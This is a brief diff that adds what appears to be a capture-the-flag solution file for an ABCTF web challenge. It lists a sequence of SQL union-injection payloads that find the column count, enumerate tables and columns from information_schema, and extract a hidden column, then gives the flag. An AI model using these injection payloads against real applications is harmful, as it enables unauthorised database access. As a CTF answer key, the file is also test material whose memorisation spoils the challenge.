@@ -1,0 +1,10 @@
+1
+1 union select 1
+1 union select 1,2
+1 union select 1,2,3
+1 union select 1,2,3,4
+1 union select table_name,2,3,4 from information_schema.tables >> w0w_y0u_f0und_m3
+1 union select column_name,2,3,4 from information_schema.columns >> f0und_m3
+1 union select f0und_m3,2,3,4 from w0w_y0u_f0und_m3
+
+abctf{uni0n_1s_4_gr34t_c0mm4nd}
